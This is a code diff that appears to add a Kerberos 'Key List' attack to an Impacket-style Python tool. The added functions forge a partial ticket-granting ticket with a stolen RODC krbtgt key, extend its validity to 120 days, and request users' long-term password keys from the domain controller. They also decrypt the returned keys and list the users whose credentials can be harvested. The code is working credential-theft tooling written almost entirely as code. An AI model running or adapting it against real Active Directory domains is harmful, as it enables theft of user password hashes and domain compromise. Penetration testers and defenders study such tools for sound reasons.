+        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
+        encTicketPart['cname']['name-string'] = noValue
+        encTicketPart['cname']['name-string'][0] = userName
+        encTicketPart['transited'] = noValue
+        encTicketPart['transited']['tr-type'] = 0
+        encTicketPart['transited']['contents'] = ''
+        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.now(timezone.utc))
+        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.now(timezone.utc))
+        # Let's extend the ticket's validity a lil bit
+        ticketDuration = datetime.now(timezone.utc) + timedelta(days=int(120))
+        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
+        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
+        # We don't need PAC
+        encTicketPart['authorization-data'] = noValue
+        # We encode the encripted part
+        encodedEncTicketPart = encoder.encode(encTicketPart)
+        # and we encrypt it with the RODC key
+        cipher = _enctype_table[partialTGT['enc-part']['etype']]
+        key = Key(cipher.enctype, unhexlify(self.__rodcKey))
+        # key usage 2 -> key tgt service
+        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)
+
+        partialTGT['enc-part']['cipher'] = cipherText
+        sessionKey = encTicketPart['key']['keyvalue']
+
+        return partialTGT, sessionKey
+
+    def getFullTGT(self, userName, partialTGT, sessionKey):
+        ticket = Ticket()
+        ticket.from_asn1(partialTGT)
+
+        apReq = AP_REQ()
+        apReq['pvno'] = 5
+        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+
+        opts = list()
+        apReq['ap-options'] = constants.encodeFlags(opts)
+        seq_set(apReq, 'ticket', ticket.to_asn1)
+
+        authenticator = Authenticator()
+        authenticator['authenticator-vno'] = 5
+        authenticator['crealm'] = partialTGT['realm'].asOctets()
+
+        seq_set(authenticator, 'cname', userName.components_to_asn1)
+
+        now = datetime.now(timezone.utc)
+        authenticator['cusec'] = now.microsecond
+        authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+        encodedAuthenticator = encoder.encode(authenticator)
+        cipher = _enctype_table[partialTGT['enc-part']['etype']]
+        keyAuth = Key(cipher.enctype, bytes(sessionKey))
+        encryptedEncodedAuthenticator = cipher.encrypt(keyAuth, 7, encodedAuthenticator, None)
+
+        apReq['authenticator'] = noValue
+        apReq['authenticator']['etype'] = cipher.enctype
+        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
+
+        tgsReq = TGS_REQ()
+        tgsReq['pvno'] = 5
+        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+        tgsReq['padata'] = noValue
+        tgsReq['padata'][0] = noValue
+        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+        encodedApReq = encoder.encode(apReq)
+        tgsReq['padata'][0]['padata-value'] = encodedApReq
+        tgsReq['padata'][1] = noValue
+        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
+        encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
+        tgsReq['padata'][1]['padata-value'] = encodedKeyReq
+
+        reqBody = seq_set(tgsReq, 'req-body')
+
+        opts = list()
+        opts.append(constants.KDCOptions.canonicalize.value)
+
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+        serverName = Principal("krbtgt", type=PrincipalNameType.NT_SRV_INST.value)
+        reqBody['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
+        reqBody['sname']['name-string'][0] = serverName
+        reqBody['sname']['name-string'][1] = self.__domain
+        reqBody['realm'] = self.__domain
+
+        now = datetime.now(timezone.utc) + timedelta(days=1)
+
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = rand.getrandbits(31)
+        seq_set_iter(reqBody, 'etype',
+                     (
+                         int(cipher.enctype),
+                         int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
+                         int(constants.EncryptionTypes.rc4_hmac.value),
+                         int(constants.EncryptionTypes.rc4_hmac_exp.value),
+                         int(constants.EncryptionTypes.rc4_hmac_old_exp.value)
+                     )
+                     )
+
+        message = encoder.encode(tgsReq)
+        # Let's send our TGS Request, the response will include the FULL TGT with the keys!!!
+        try:
+            logging.debug("Requesting a service ticket for the user %s", userName)
+            resp = sendReceive(message, self.__domain, self.__kdcHostName)
+        except Exception as error:
+            if str(error).find('KDC_ERR_TGT_REVOKED') >= 0 or str(error).find('KDC_ERR_CLIENT_REVOKED') >= 0:
+                logging.error("User %s is not allowed to have passwords replicated in RODCs", userName)
+            elif str(error).find('KDC_ERR_C_PRINCIPAL_UNKNOWN') >= 0:
+                logging.error("User %s doesn't exist", userName)
+            elif str(error).find('KDC_ERR_KEY_EXPIRED') >= 0:
+                logging.error("User %s's password has expired", userName)
+            elif str(error).find('Connection timed out') >= 0:
+                raise Exception("Connection timed out: check the KDC HostName or IP address, aborting")
+            elif str(error).find('Name or service not known') >= 0:
+                raise Exception("Name or service not known: check the KDC HostName or IP address, aborting")
+            elif str(error).find('KDC_ERR_WRONG_REALM') >= 0:
+                raise Exception("KDC_ERR_WRONG_REALM: domain doesn't exist, aborting")
+            elif str(error).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:
+                raise Exception("KDC_ERR_S_PRINCIPAL_UNKNOWN: check the RODC krbtgt account number, aborting")
+            elif str(error).find('KRB_AP_ERR_BAD_INTEGRITY') >= 0:
+                raise Exception("KRB_AP_ERR_BAD_INTEGRITY: check the RODC AES key, aborting")
+            else:
+                logging.error(error)
+            return None
+        return resp
+
+    @staticmethod
+    def getKey(resp, sessionKey):
+        tgsRep = decoder.decode(resp, asn1Spec=TGS_REP())[0]
+
+        encTGSRepPart = tgsRep['enc-part']
+        enctype = encTGSRepPart['etype']
+        cipher = _enctype_table[enctype]
+
+        keyAuth = Key(cipher.enctype, bytes(sessionKey))
+        decryptedTGSRepPart = cipher.decrypt(keyAuth, 8, encTGSRepPart['cipher'])
+        decodedTGSRepPart = decoder.decode(decryptedTGSRepPart, asn1Spec=EncTGSRepPart())[0]
+        encPaData1 = decodedTGSRepPart['encrypted_pa_data'][0]
+        decodedPaData1 = decoder.decode(encPaData1['padata-value'], asn1Spec=KERB_KEY_LIST_REP())[0]
+        key = decodedPaData1[0]['keyvalue'].prettyPrint()
+
+        return key
+
+    def getAllowedUsersToReplicate(self):
+        # Enumerate all groups in domain
+        resp = self.__remoteOps.getGroupsInDomain()
+        groupsList = []
+        for group in resp['Buffer']['Buffer']:
+            groupsList.append(group['RelativeId'])
+
+        # Enumerate all aliases in domain
+        resp = self.__remoteOps.getAliasesInDomain()
+        aliasesList = []
+        for alias in resp['Buffer']['Buffer']:
+            aliasesList.append(alias['RelativeId'])
+
+        # Enumerate denied users to replicate (alias "Denied Password Replication" RID:572)
+        resp = self.__remoteOps.getMembersInAlias(rid=572)
+        deniedList = [500, 501, 502, 503]
+        for user in resp['Members']['Sids']:
+            rid = user['Data']['SidPointer']['SubAuthority'][4]
+            if rid not in deniedList:
+                deniedList.append(rid)
+
+        # Enumerate denied users in nested groups/aliases
+        for rid in deniedList:
+            if rid in groupsList:
+                resp = self.__remoteOps.getMembersInGroup(rid)
+                for user in resp['Members']['Members']:
+                    rid2 = user['Data']
+                    if rid2 not in deniedList:
+                        deniedList.append(rid2)
+            elif rid in aliasesList:
+                resp = self.__remoteOps.getMembersInAlias(rid)
+                for user in resp['Members']['Sids']:
+                    rid2 = user['Data']['SidPointer']['SubAuthority'][4]
+                    if rid2 not in deniedList:
+                        deniedList.append(rid2)
+
+        # Enumerate all users and filter denied ones
+        resp = self.__remoteOps.getDomainUsers()
+        targetList = []
+        for user in resp['Buffer']['Buffer']:
+            if user['RelativeId'] not in deniedList and "krbtgt_" not in user['Name']:
+                targetList.append(user['Name'] + ":" + str(user['RelativeId']))
+
+        return targetList
+
 
 def _print_helper(*args, **kwargs):
     print(args[-1])
